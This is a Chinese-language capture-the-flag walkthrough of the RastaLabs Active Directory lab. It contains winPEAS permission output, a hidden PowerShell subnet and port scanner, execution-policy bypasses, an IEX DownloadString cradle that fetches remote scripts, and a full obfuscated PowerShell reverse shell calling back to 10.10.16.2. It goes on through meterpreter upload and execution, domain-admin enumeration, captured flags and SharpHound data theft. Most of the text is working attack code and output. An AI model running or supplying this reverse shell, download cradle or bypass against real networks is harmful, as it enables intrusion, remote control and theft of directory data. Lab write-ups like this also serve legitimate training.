     File Permissions "c:\users\administrator\AppData\LocalLow\Microsoft\CryptnetUrlCache\Content\80237EE4964FC9C409AAF55BF996A292_E503B048B745DFA14B81FCFC68D6DECE": tquinn [Allow: AllAccess]                 
     File Permissions "c:\users\administrator\AppData\LocalLow\Microsoft\CryptnetUrlCache\Content\80237EE4964FC9C409AAF55BF996A292_D46D6FA25B74360E1349F9015B5CCE53": tquinn [Allow: AllAccess]                 
     File Permissions "c:\users\administrator\AppData\LocalLow\Microsoft\CryptnetUrlCache\Content\80237EE4964FC9C409AAF55BF996A292_C5130A0BDC8C859A2757D77746C10868": tquinn [Allow: AllAccess]                 
     File Permissions "c:\users\administrator\AppData\LocalLow\Microsoft\CryptnetUrlCache\Content\77EC63BDA74BD0D0E0426DC8F8008506": tquinn [Allow: AllAccess]                                                  
     File Permissions "c:\users\administrator\AppData\LocalLow\Microsoft\CryptnetUrlCache\Content\7423F88C7F265F0DEFC08EA88C3BDE45_AA1E8580D4EBC816148CE81268683776": tquinn [Allow: AllAccess]                 
     File Permissions "c:\users\administrator\AppData\LocalLow\Microsoft\CryptnetUrlCache\Content\57C8EDB95DF3F0AD4EE2DC2B8CFD4157": tquinn [Allow: AllAccess]                                                  
     File Permissions "c:\users\administrator\AppData\LocalLow\Microsoft\CryptnetUrlCache\Content\4E4160FB650E5091C535216313A4ECD3_C830356EF6A2FF5E1E0A151AF6B8D0FA": tquinn [Allow: AllAccess]                 
     Folder Permissions "c:\users\administrator\AppData\LocalLow\Microsoft\CryptnetUrlCache\Content": tquinn [Allow: AllAccess]                                                                                 
     File Permissions "c:\users\administrator\AppData\LocalLow\Microsoft\CryptnetUrlCache\Content\30069012ED3CF5DB92F9F4FC78D55E2D_87238437CEFCADF00F1385E31A888EF4": tquinn [Allow: AllAccess]                 
     Folder Permissions "c:\users\administrator\3D Objects": tquinn [Allow: AllAccess]
     File Permissions "c:\users\administrator\3D Objects\desktop.ini": tquinn [Allow: AllAccess]
     File Permissions "c:\users\administrator\ntuser.ini": tquinn [Allow: AllAccess]
     File Permissions "c:\users\administrator\NTUSER.DAT{d1677e7b-098a-11ec-9511-005056b9b2ce}.TMContainer00000000000000000002.regtrans-ms": tquinn [Allow: AllAccess]                                          
     File Permissions "c:\users\administrator\NTUSER.DAT{d1677e7b-098a-11ec-9511-005056b9b2ce}.TMContainer00000000000000000001.regtrans-ms": tquinn [Allow: AllAccess]                                          
     File Permissions "c:\users\administrator\NTUSER.DAT{d1677e7b-098a-11ec-9511-005056b9b2ce}.TM.blf": tquinn [Allow: AllAccess]                                                                               
     File Permissions "c:\users\administrator\ntuser.dat.LOG2": tquinn [Allow: AllAccess]
     File Permissions "c:\users\administrator\ntuser.dat.LOG1": tquinn [Allow: AllAccess]
     File Permissions "c:\users\administrator\NTUSER.DAT": tquinn [Allow: AllAccess]
     Folder Permissions "c:\users\administrator\Videos": tquinn [Allow: AllAccess]
     Folder Permissions "c:\users\administrator\Templates": tquinn [Allow: AllAccess]
     Folder Permissions "c:\users\administrator\Start Menu": tquinn [Allow: AllAccess]
     Folder Permissions "c:\users\administrator\SendTo": tquinn [Allow: AllAccess]
     Folder Permissions "c:\users\administrator\Searches": tquinn [Allow: AllAccess]
     Folder Permissions "c:\users\administrator\Saved Games": tquinn [Allow: AllAccess]
     Folder Permissions "c:\users\administrator\Recent": tquinn [Allow: AllAccess]
     Folder Permissions "c:\users\administrator\PrintHood": tquinn [Allow: AllAccess]
     Folder Permissions "c:\users\administrator\Pictures": tquinn [Allow: AllAccess]
     Folder Permissions "c:\users\administrator\OneDrive": tquinn [Allow: AllAccess]
     Folder Permissions "c:\users\administrator\NetHood": tquinn [Allow: AllAccess]
     Folder Permissions "c:\users\administrator\My Documents": tquinn [Allow: AllAccess]
     Folder Permissions "c:\users\administrator\Music": tquinn [Allow: AllAccess]
     Folder Permissions "c:\users\administrator\Local Settings": tquinn [Allow: AllAccess]
     Folder Permissions "c:\users\administrator\Links": tquinn [Allow: AllAccess]
     Folder Permissions "c:\users\administrator\Favorites": tquinn [Allow: AllAccess]
     Folder Permissions "c:\users\administrator\Downloads": tquinn [Allow: AllAccess]
     Folder Permissions "c:\users\administrator\Documents": tquinn [Allow: AllAccess]
     Folder Permissions "c:\users\administrator\Desktop": tquinn [Allow: AllAccess]
     Folder Permissions "c:\users\administrator\Cookies": tquinn [Allow: AllAccess]
     Folder Permissions "c:\users\administrator\Contacts": tquinn [Allow: AllAccess]
     Folder Permissions "c:\users\administrator\Application Data": tquinn [Allow: AllAccess]
     Folder Permissions "c:\users\administrator\AppData": tquinn [Allow: AllAccess]
     Folder Permissions "c:\users\administrator\3D Objects": tquinn [Allow: AllAccess]
     Folder Permissions "c:\users\administrator\Music": tquinn [Allow: AllAccess]
     File Permissions "c:\users\administrator\Music\desktop.ini": tquinn [Allow: AllAccess]
     File Permissions "c:\users\administrator\Links\Downloads.lnk": tquinn [Allow: AllAccess]
     File Permissions "c:\users\administrator\Links\Desktop.lnk": tquinn [Allow: AllAccess]
     Folder Permissions "c:\users\administrator\Links": tquinn [Allow: AllAccess]
     File Permissions "c:\users\administrator\Links\desktop.ini": tquinn [Allow: AllAccess]
     Folder Permissions "c:\users\administrator\Favorites\Links": tquinn [Allow: AllAccess]
     File Permissions "c:\users\administrator\Favorites\Links\desktop.ini": tquinn [Allow: AllAccess]
     File Permissions "c:\users\administrator\Favorites\Bing.url": tquinn [Allow: AllAccess]
     Folder Permissions "c:\users\administrator\Favorites": tquinn [Allow: AllAccess]
     File Permissions "c:\users\administrator\Favorites\desktop.ini": tquinn [Allow: AllAccess]
     Folder Permissions "c:\users\administrator\Downloads": tquinn [Allow: AllAccess]
     File Permissions "c:\users\administrator\Downloads\desktop.ini": tquinn [Allow: AllAccess]
     Folder Permissions "c:\users\administrator\Documents": tquinn [Allow: AllAccess]
     File Permissions "c:\users\administrator\Documents\desktop.ini": tquinn [Allow: AllAccess]
     Folder Permissions "c:\users\administrator\Desktop": tquinn [Allow: AllAccess]
     File Permissions "c:\users\administrator\Desktop\desktop.ini": tquinn [Allow: AllAccess]
     Folder Permissions "c:\users\administrator\Contacts": tquinn [Allow: AllAccess]
     File Permissions "c:\users\administrator\Contacts\desktop.ini": tquinn [Allow: AllAccess]
     Folder Permissions "c:\users\administrator\Videos": tquinn [Allow: AllAccess]
     File Permissions "c:\users\administrator\Videos\desktop.ini": tquinn [Allow: AllAccess]
     File Permissions "c:\users\administrator\Searches\winrt--{S-1-5-21-1396373213-2872852198-2033860859-500}-.searchconnector-ms": tquinn [Allow: AllAccess]                                                   
     File Permissions "c:\users\administrator\Searches\Indexed Locations.search-ms": tquinn [Allow: AllAccess]                                                                                                  
     File Permissions "c:\users\administrator\Searches\Everywhere.search-ms": tquinn [Allow: AllAccess]
     Folder Permissions "c:\users\administrator\Searches": tquinn [Allow: AllAccess]
     File Permissions "c:\users\administrator\Searches\desktop.ini": tquinn [Allow: AllAccess]
     Folder Permissions "c:\users\administrator\Saved Games": tquinn [Allow: AllAccess]
     File Permissions "c:\users\administrator\Saved Games\desktop.ini": tquinn [Allow: AllAccess]
     Folder Permissions "c:\users\administrator\Pictures": tquinn [Allow: AllAccess]
     File Permissions "c:\users\administrator\Pictures\desktop.ini": tquinn [Allow: AllAccess]
     Folder Permissions "c:\users\administrator\OneDrive": tquinn [Allow: AllAccess]
     File Permissions "c:\users\administrator\OneDrive\desktop.ini": tquinn [Allow: AllAccess]
   =================================================================================================


???????????? Searching executable files in non-default folders with write (equivalent) permissions (can be slow)                                                                                                
     File Permissions "C:\temp\agent.exe": Authenticated Users [Allow: WriteData/CreateFiles]
     File Permissions "C:\Users\Administrator\AppData\Local\Microsoft\OneDrive\OneDriveStandaloneUpdater.exe": tquinn [Allow: AllAccess]                                                                        
     File Permissions "C:\Users\Administrator\AppData\Local\Microsoft\OneDrive\OneDrive.exe": tquinn [Allow: AllAccess]                                                                                         
     File Permissions "C:\Users\Administrator\AppData\Local\Microsoft\WindowsApps\winget.exe": tquinn [Allow: AllAccess]                                                                                        
     File Permissions "C:\Users\Administrator\AppData\Local\Microsoft\WindowsApps\WindowsPackageManagerServer.exe": tquinn [Allow: AllAccess]                                                                   
     File Permissions "C:\Users\Administrator\AppData\Local\Microsoft\WindowsApps\Skype.exe": tquinn [Allow: AllAccess]                                                                                         
     File Permissions "C:\Users\Administrator\AppData\Local\Microsoft\WindowsApps\python3.exe": tquinn [Allow: AllAccess]                                                                                       
     File Permissions "C:\Users\Administrator\AppData\Local\Microsoft\WindowsApps\python.exe": tquinn [Allow: AllAccess]                                                                                        
     File Permissions "C:\Users\Administrator\AppData\Local\Microsoft\WindowsApps\MicrosoftEdge.exe": tquinn [Allow: AllAccess]                                                                                 
     File Permissions "C:\Users\Administrator\AppData\Local\Microsoft\WindowsApps\GameBarElevatedFT_Alias.exe": tquinn [Allow: AllAccess]                                                                       
     File Permissions "C:\Users\Administrator\AppData\Local\Microsoft\WindowsApps\Microsoft.XboxGamingOverlay_8wekyb3d8bbwe\GameBarElevatedFT_Alias.exe": tquinn [Allow: AllAccess]                             
     File Permissions "C:\Users\Administrator\AppData\Local\Microsoft\WindowsApps\Microsoft.SkypeApp_kzf8qxf38zg5c\Skype.exe": tquinn [Allow: AllAccess]                                                        
     File Permissions "C:\Users\Administrator\AppData\Local\Microsoft\WindowsApps\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\MicrosoftEdge.exe": tquinn [Allow: AllAccess]                                           
     File Permissions "C:\Users\Administrator\AppData\Local\Microsoft\WindowsApps\Microsoft.DesktopAppInstaller_8wekyb3d8bbwe\winget.exe": tquinn [Allow: AllAccess]                                            
     File Permissions "C:\Users\Administrator\AppData\Local\Microsoft\WindowsApps\Microsoft.DesktopAppInstaller_8wekyb3d8bbwe\WindowsPackageManagerServer.exe": tquinn [Allow: AllAccess]                       
     File Permissions "C:\Users\Administrator\AppData\Local\Microsoft\WindowsApps\Microsoft.DesktopAppInstaller_8wekyb3d8bbwe\python3.exe": tquinn [Allow: AllAccess]                                           
     File Permissions "C:\Users\Administrator\AppData\Local\Microsoft\WindowsApps\Microsoft.DesktopAppInstaller_8wekyb3d8bbwe\python.exe": tquinn [Allow: AllAccess]                                            
     File Permissions "C:\Users\Administrator.WS06\AppData\Local\Microsoft\OneDrive\OneDriveStandaloneUpdater.exe": tquinn [Allow: AllAccess]                                                                   
     File Permissions "C:\Users\Administrator.WS06\AppData\Local\Microsoft\OneDrive\OneDrive.exe": tquinn [Allow: AllAccess]                                                                                    
     File Permissions "C:\Users\Administrator.WS06\AppData\Local\Microsoft\OneDrive\19.002.0107.0005\CollectSyncLogs.bat": tquinn [Allow: AllAccess]                                                            
     File Permissions "C:\Users\Administrator.WS06\AppData\Local\Microsoft\OneDrive\19.002.0107.0005\FileCoAuth.exe": tquinn [Allow: AllAccess]                                                                 
     File Permissions "C:\Users\Administrator.WS06\AppData\Local\Microsoft\OneDrive\19.002.0107.0005\FileSyncConfig.exe": tquinn [Allow: AllAccess]                                                             
     File Permissions "C:\Users\Administrator.WS06\AppData\Local\Microsoft\OneDrive\19.002.0107.0005\OneDriveSetup.exe": tquinn [Allow: AllAccess]                                                              
     File Permissions "C:\Users\Administrator.WS06\AppData\Local\Microsoft\WindowsApps\Skype.exe": tquinn [Allow: AllAccess]                                                                                    
     File Permissions "C:\Users\Administrator.WS06\AppData\Local\Microsoft\WindowsApps\python3.exe": tquinn [Allow: AllAccess]                                                                                  
     File Permissions "C:\Users\Administrator.WS06\AppData\Local\Microsoft\WindowsApps\python.exe": tquinn [Allow: AllAccess]                                                                                   
     File Permissions "C:\Users\Administrator.WS06\AppData\Local\Microsoft\WindowsApps\MicrosoftEdge.exe": tquinn [Allow: AllAccess]                                                                            
     File Permissions "C:\Users\Administrator.WS06\AppData\Local\Microsoft\WindowsApps\GameBarElevatedFT_Alias.exe": tquinn [Allow: AllAccess]                                                                  
     File Permissions "C:\Users\Administrator.WS06\AppData\Local\Microsoft\WindowsApps\Microsoft.XboxGamingOverlay_8wekyb3d8bbwe\GameBarElevatedFT_Alias.exe": tquinn [Allow: AllAccess]                        
     File Permissions "C:\Users\Administrator.WS06\AppData\Local\Microsoft\WindowsApps\Microsoft.SkypeApp_kzf8qxf38zg5c\Skype.exe": tquinn [Allow: AllAccess]                                                   
     File Permissions "C:\Users\Administrator.WS06\AppData\Local\Microsoft\WindowsApps\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\MicrosoftEdge.exe": tquinn [Allow: AllAccess]                                      
     File Permissions "C:\Users\Administrator.WS06\AppData\Local\Microsoft\WindowsApps\Microsoft.DesktopAppInstaller_8wekyb3d8bbwe\python3.exe": tquinn [Allow: AllAccess]                                      
     File Permissions "C:\Users\Administrator.WS06\AppData\Local\Microsoft\WindowsApps\Microsoft.DesktopAppInstaller_8wekyb3d8bbwe\python.exe": tquinn [Allow: AllAccess]                                       
     File Permissions "C:\Users\All Users\Synaptics\Synaptics.exe": tquinn [Allow: AllAccess]
     File Permissions "C:\Users\tquinn\winpeas.exe": tquinn [Allow: AllAccess]
     File Permissions "C:\Users\tquinn\SharpHound.exe": tquinn [Allow: AllAccess]
     File Permissions "C:\Users\tquinn\AppData\Local\slack\Update.exe": tquinn [Allow: AllAccess]
     File Permissions "C:\Users\tquinn\AppData\Local\Microsoft\OneDrive\OneDriveStandaloneUpdater.exe": tquinn [Allow: AllAccess]
     File Permissions "C:\Users\tquinn\AppData\Local\Microsoft\OneDrive\OneDrive.exe": tquinn [Allow: AllAccess]
     File Permissions "C:\Users\tquinn\AppData\Local\Microsoft\Windows\INetCache\IE\RPKZW33A\CO.exe": tquinn [Allow: AllAccess]
     File Permissions "C:\Users\tquinn\AppData\Local\Microsoft\Windows\INetCache\IE\IRV36146\updata.exe": tquinn [Allow: AllAccess]
     File Permissions "C:\Users\tquinn\AppData\Local\Microsoft\Windows\INetCache\IE\B6HE9TD6\shell.exe": tquinn [Allow: AllAccess]
     File Permissions "C:\Users\tquinn\AppData\Local\Microsoft\WindowsApps\winget.exe": tquinn [Allow: AllAccess]
     File Permissions "C:\Users\tquinn\AppData\Local\Microsoft\WindowsApps\WindowsPackageManagerServer.exe": tquinn [Allow: AllAccess]
     File Permissions "C:\Users\tquinn\AppData\Local\Microsoft\WindowsApps\python3.exe": tquinn [Allow: AllAccess]
     File Permissions "C:\Users\tquinn\AppData\Local\Microsoft\WindowsApps\python.exe": tquinn [Allow: AllAccess]
     File Permissions "C:\Users\tquinn\AppData\Local\Microsoft\WindowsApps\MicrosoftEdge.exe": tquinn [Allow: AllAccess]
     File Permissions "C:\Users\tquinn\AppData\Local\Microsoft\WindowsApps\GameBarElevatedFT_Alias.exe": tquinn [Allow: AllAccess]
     File Permissions "C:\Users\tquinn\AppData\Local\Microsoft\WindowsApps\Microsoft.XboxGamingOverlay_8wekyb3d8bbwe\GameBarElevatedFT_Alias.exe": tquinn [Allow: AllAccess]
     File Permissions "C:\Users\tquinn\AppData\Local\Microsoft\WindowsApps\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\MicrosoftEdge.exe": tquinn [Allow: AllAccess]
     File Permissions "C:\Users\tquinn\AppData\Local\Microsoft\WindowsApps\Microsoft.DesktopAppInstaller_8wekyb3d8bbwe\winget.exe": tquinn [Allow: AllAccess]
     File Permissions "C:\Users\tquinn\AppData\Local\Microsoft\WindowsApps\Microsoft.DesktopAppInstaller_8wekyb3d8bbwe\WindowsPackageManagerServer.exe": tquinn [Allow: AllAccess]
     File Permissions "C:\Users\tquinn\AppData\Local\Microsoft\WindowsApps\Microsoft.DesktopAppInstaller_8wekyb3d8bbwe\python3.exe": tquinn [Allow: AllAccess]
     File Permissions "C:\Users\tquinn\AppData\Local\Microsoft\WindowsApps\Microsoft.DesktopAppInstaller_8wekyb3d8bbwe\python.exe": tquinn [Allow: AllAccess]

???????????? Looking for Linux shells/distributions - wsl.exe, bash.exe
    C:\Windows\System32\wsl.exe

    WSL - no installed Linux distributions found.

       /---------------------------------------------------------------------------------\              
       |                             Do you like PEASS?                                  |              
       |---------------------------------------------------------------------------------|              
       |         Learn Cloud Hacking       :     training.hacktricks.xyz                 |              
       |         Follow on Twitter         :     @hacktricks_live                        |              
       |         Respect on HTB            :     SirBroccoli                             |              
       |---------------------------------------------------------------------------------|              
       |                                 Thank you!                                      |              
       \---------------------------------------------------------------------------------/              
                                                                                                      
```

## 内网IP探活+内网端口探活
```plain
powershell -nop -w hidden -c "$subs='10.10.120','10.10.121','10.10.122','10.10.123';$ports=21,22,23,25,53,80,88,110,135,139,143,389,443,445,993,995,1433,1521,3306,3389,5432,5900,5985,6379,8080,8443,8888,9090;foreach($s in $subs){for($i=1;$i-le 254;$i++){$ip=\"$s.$i\";$ping=New-Object System.Net.NetworkInformation.Ping;try{if($ping.Send($ip,100).Status -eq 'Success'){foreach($p in $ports){$t=New-Object System.Net.Sockets.TcpClient;try{if($t.ConnectAsync($ip,$p).Wait(200)){Write-Host \"$ip`:$p OPEN\"}}catch{};finally{$t.Close()}}}}catch{}}}"
```





## PowerView
### Load
```plain
upload /home/kali/Desktop/tools/PowerSploit/PowerView.ps1 C:\\Users\\Public\\PowerView.ps1
```

```plain
Import-Module C:\Users\Public\PowerView.ps1
```

```plain
PS C:\Users\Public> . .\PowerView.ps1
PS C:\Users\Public> _/=\/==\_/==\_____ : File C:\Users\Public\PowerView.ps1 cannot be loaded because running scripts is disabled on this 
system. For more information, see about_Execution_Policies at https:/go.microsoft.com/fwlink/?LinkID=135170.
At line:70 char:1
+ _/=\/==\_/==\_____ -__/\/\/=\_/\/\____ -__/==\/=\_/==\/==\ 10.10.16.2 ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (:) [Write-Error], WriteErrorException
    + FullyQualifiedErrorId : Microsoft.PowerShell.Commands.WriteErrorException,_/=\/==\_/==\_____
```

 系统不允许执行 `.ps1` 脚本，所以 PowerShell 阻止加载 PowerView。  

### Bypass
#### 方法 1— 临时绕过 ⭐
只对当前 PowerShell 会话生效：

```plain
Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass
```

然后再加载：

```plain
. .\PowerView.ps1
```

优点：

+ 不需要管理员权限
+ 不修改系统策略
+ 渗透测试最常用

---

#### 方法 2 — PowerShell 启动时绕过
直接用 bypass 启动：

```plain
powershell -ep bypass
```

然后：

```plain
. .\PowerView.ps1
```

---

#### 方法 3 — 一行直接加载
不用保存文件：

```plain
IEX (New-Object Net.WebClient).DownloadString('http://YOURIP/PowerView.ps1')
```

或者：

```plain
powershell -exec bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://YOURIP/PowerView.ps1')"
```

---

### Find-LocalAdminAccess
```plain
PS C:\Users\Public> Find-LocalAdminAccess
srv01.rastalabs.local
```

### Find-DomainUserLocation
**找管理员登录机器  **

```plain
PS C:\Users\Public> Find-DomainUserLocation
PS C:\Users\Public> 
```

### Get-NetGroupMember "Domain Admins"
找域管理员

```plain
PS C:\Users\Public> Get-NetGroupMember "Domain Admins"


GroupDomain             : rastalabs.local
GroupName               : Domain Admins
GroupDistinguishedName  : CN=Domain Admins,CN=Users,DC=rastalabs,DC=local
MemberDomain            : rastalabs.local
MemberName              : rweston_da
MemberDistinguishedName : CN=Rhys Weston (DA),CN=Users,DC=rastalabs,DC=local
MemberObjectClass       : user
MemberSID               : S-1-5-21-1396373213-2872852198-2033860859-1161

GroupDomain             : rastalabs.local
GroupName               : Domain Admins
GroupDistinguishedName  : CN=Domain Admins,CN=Users,DC=rastalabs,DC=local
MemberDomain            : rastalabs.local
MemberName              : Administrator
MemberDistinguishedName : CN=Administrator,CN=Users,DC=rastalabs,DC=local
MemberObjectClass       : user
MemberSID               : S-1-5-21-1396373213-2872852198-2033860859-500
```

### srv01.rastalabs.local
```plain
Invoke-Command -ComputerName srv01.rastalabs.local -ScriptBlock {hostname}
srv01
```

# WS04-10.10.123.101-RLAB\bowen
## 反弹shell
msf的shell不好使，需要自行反弹

```plain
 function _/=\/==\_/==\_____ 
{ 
    [CmdletBinding(DefaultParameterSetName="reverse")] Param(
        [Parameter(Position = 0, Mandatory = $true, ParameterSetName="reverse")]
        [Parameter(Position = 0, Mandatory = $false, ParameterSetName="bind")]
        [String]
        ${__/==\/=\_/==\/==\},
        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="reverse")]
        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="bind")]
        [Int]
        ${__/====\/\___/=\/\},
        [Parameter(ParameterSetName="reverse")]
        [Switch]
        ${__/\/\/=\_/\/\____},
        [Parameter(ParameterSetName="bind")]
        [Switch]
        ${__/=\_/\___/\/\__/}
    )
    try 
    {
        if (${__/\/\/=\_/\/\____})
        {
            ${/=\___/\__/\___/=} = New-Object System.Net.Sockets.TCPClient(${__/==\/=\_/==\/==\},${__/====\/\___/=\/\})
        }
        if (${__/=\_/\___/\/\__/})
        {
            ${_/===\___/=====\_} = [System.Net.Sockets.TcpListener]${__/====\/\___/=\/\}
            ${_/===\___/=====\_}.start()    
            ${/=\___/\__/\___/=} = ${_/===\___/=====\_}.AcceptTcpClient()
        } 
        ${/==\/====\___/\_/} = ${/=\___/\__/\___/=}.GetStream()
        [byte[]]${/==\/===\_/\_____} = 0..65535|%{0}
        ${/===\/\__/=======} = ([text.encoding]::ASCII).GetBytes($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFAAbwB3AGUAcgBTAGgAZQBsAGwAIAByAHUAbgBuAGkAbgBnACAAYQBzACAAdQBzAGUAcgAgAA=='))) + $env:username + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IABvAG4AIAA='))) + $env:computername + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('CgBDAG8AcAB5AHIAaQBnAGgAdAAgACgAQwApACAAMgAwADEANQAgAE0AaQBjAHIAbwBzAG8AZgB0ACAAQwBvAHIAcABvAHIAYQB0AGkAbwBuAC4AIABBAGwAbAAgAHIAaQBnAGgAdABzACAAcgBlAHMAZQByAHYAZQBkAC4ACgAKAA=='))))
        ${/==\/====\___/\_/}.Write(${/===\/\__/=======},0,${/===\/\__/=======}.Length)
        ${/===\/\__/=======} = ([text.encoding]::ASCII).GetBytes($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABTACAA'))) + (gl).Path + '>')
        ${/==\/====\___/\_/}.Write(${/===\/\__/=======},0,${/===\/\__/=======}.Length)
        while((${/===\__/=\/=\_/==} = ${/==\/====\___/\_/}.Read(${/==\/===\_/\_____}, 0, ${/==\/===\_/\_____}.Length)) -ne 0)
        {
            ${/=\______/\__/\/=} = New-Object -TypeName System.Text.ASCIIEncoding
            ${_/\/\__/\/\____/\} = ${/=\______/\__/\/=}.GetString(${/==\/===\_/\_____},0, ${/===\__/=\/=\_/==})
            try
            {
                ${/=\/=\/\__/=\/==\} = (iex -Command ${_/\/\__/\/\____/\} 2>&1 | Out-String )
            }
            catch
            {
                Write-Warning $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBvAG0AZQB0AGgAaQBuAGcAIAB3AGUAbgB0ACAAdwByAG8AbgBnACAAdwBpAHQAaAAgAGUAeABlAGMAdQB0AGkAbwBuACAAbwBmACAAYwBvAG0AbQBhAG4AZAAgAG8AbgAgAHQAaABlACAAdABhAHIAZwBlAHQALgA='))) 
                Write-Error $_
            }
            ${__/\____/===\/\__}  = ${/=\/=\/\__/=\/==\} + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABTACAA'))) + (gl).Path + '> '
            ${__/==\/==\_/\_/\/} = ($error[0] | Out-String)
            $error.clear()
            ${__/\____/===\/\__} = ${__/\____/===\/\__} + ${__/==\/==\_/\_/\/}
            ${___/==\__/\___/==} = ([text.encoding]::ASCII).GetBytes(${__/\____/===\/\__})
            ${/==\/====\___/\_/}.Write(${___/==\__/\___/==},0,${___/==\__/\___/==}.Length)
            ${/==\/====\___/\_/}.Flush()  
        }
        ${/=\___/\__/\___/=}.Close()
        if (${_/===\___/=====\_})
        {
            ${_/===\___/=====\_}.Stop()
        }
    }
    catch
    {
        Write-Warning $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBvAG0AZQB0AGgAaQBuAGcAIAB3AGUAbgB0ACAAdwByAG8AbgBnACEAIABDAGgAZQBjAGsAIABpAGYAIAB0AGgAZQAgAHMAZQByAHYAZQByACAAaQBzACAAcgBlAGEAYwBoAGEAYgBsAGUAIABhAG4AZAAgAHkAbwB1ACAAYQByAGUAIAB1AHMAaQBuAGcAIAB0AGgAZQAgAGMAbwByAHIAZQBjAHQAIABwAG8AcgB0AC4A'))) 
        Write-Error $_
    }
}
_/=\/==\_/==\_____ -__/\/\/=\_/\/\____ -__/==\/=\_/==\/==\ 10.10.16.2 -__/====\/\___/=\/\ 80
```

```plain
nc -lvnp 80 
```

```plain
meterpreter > upload /home/kali/Desktop/htb/rastalabs/rev.ps1 C:\\Users\\Public
[*] Uploading  : /home/kali/Desktop/htb/rastalabs/rev.ps1 -> C:\Users\Public\rev.ps1
[*] Completed  : /home/kali/Desktop/htb/rastalabs/rev.ps1 -> C:\Users\Public\rev.ps1

meterpreter > execute -f powershell.exe -a "-ExecutionPolicy Bypass -File C:\Users\Public\rev.ps1"
Process 5460 created.
```

```plain
Windows PowerShell running as user bowen on WS04
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS Microsoft.PowerShell.Core\FileSystem::\\fs01.rastalabs.local\home$\bowen\Desktop>whoami
rlab\bowen
```

## Getflag
```plain
PS Microsoft.PowerShell.Core\FileSystem::\\fs01.rastalabs.local\home$\bowen\Desktop> type flag.txt
RASTA{w007_f007h0ld_l375_pwn}
```

## 信息收集
### show_mount
```plain
meterpreter > show_mount

Mounts / Drives
===============

Name  Type    Size (Total)  Size (Free)  Mapped to
----  ----    ------------  -----------  ---------
C:\   fixed   18.68 GiB     5.32 GiB
H:\   remote  17.51 GiB     3.78 GiB     \\fs01.rastalabs.local\home$\bowen\
```

### net view \\fs01
```plain
PS C:\Users\bowen> net view \\fs01
Shared resources at \\fs01



Share name  Type  Used as  Comment  

-------------------------------------------------------------------------------
finance     Disk                    
The command completed successfully.

PS C:\Users\bowen> dir \\fs01\finance


    Directory: \\fs01\finance


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a----        31/10/2017     19:21             32 flag.txt        
```

### ipconfig
```plain
PS C:\Users> ipconfig

Windows IP Configuration


Ethernet adapter Ethernet0 2:

   Connection-specific DNS Suffix  . : 
   Link-local IPv6 Address . . . . . : fe80::1a34:1dda:3ec1:35e7%6
   IPv4 Address. . . . . . . . . . . : 10.10.123.101
   Subnet Mask . . . . . . . . . . . : 255.255.254.0
   Default Gateway . . . . . . . . . : 10.10.122.254
```

### whoami /groups
```plain
PS C:\Users> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                 Type             SID                                            Attributes                                        
========================================== ================ ============================================== ==================================================
Everyone                                   Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\INTERACTIVE                   Well-known group S-1-5-4                                        Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                              Well-known group S-1-2-1                                        Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
LOCAL                                      Well-known group S-1-2-0                                        Mandatory group, Enabled by default, Enabled group
RLAB\Finance                               Group            S-1-5-21-1396373213-2872852198-2033860859-1166 Mandatory group, Enabled by default, Enabled group
Authentication authority asserted identity Well-known group S-1-18-1                                       Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192  
```

### whoami /priv
```plain
PS C:\Users> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State   
============================= ==================================== ========
SeShutdownPrivilege           Shut down the system                 Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled 
SeUndockPrivilege             Remove computer from docking station Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
SeTimeZonePrivilege           Change the time zone                 Disabled
```

### cmdkey /list
```plain
PS C:\Users> cmdkey /list

Currently stored credentials:

    Target: LegacyGeneric:target=bowen
    Type: Generic 
    User: bowen
```

## Getflag
```plain
PS C:\Users\bowen> type \\fs01\finance\flag.txt
RASTA{ju1cy_1nf0_1n_0p3n_5h4r35}
```

## bloodhounnd
```plain
meterpreter > upload /home/kali/Desktop/tools/sharphound/SharpHound-v2.3.4/SharpHound.exe C:\\Users\\Public\\SharpHound.exe
[*] Uploading  : /home/kali/Desktop/tools/sharphound/SharpHound-v2.3.4/SharpHound.exe -> C:\Users\Public\SharpHound.exe
[*] Uploaded 2.02 MiB of 2.02 MiB (100.0%): /home/kali/Desktop/tools/sharphound/SharpHound-v2.3.4/SharpHound.exe -> C:\Users\Public\SharpHound.exe
[*] Completed  : /home/kali/Desktop/tools/sharphound/SharpHound-v2.3.4/SharpHound.exe -> C:\Users\Public\SharpHound.exe
```

```plain
.\SharpHound.exe -c All --zipfilename loot.zip
```

```plain
meterpreter > download C:\\Users\\Public\\20260313193007_loot.zip 
[*] Downloading: C:\Users\Public\20260313193007_loot.zip -> /home/kali/Desktop/htb/rastalabs/20260313193007_loot.zip
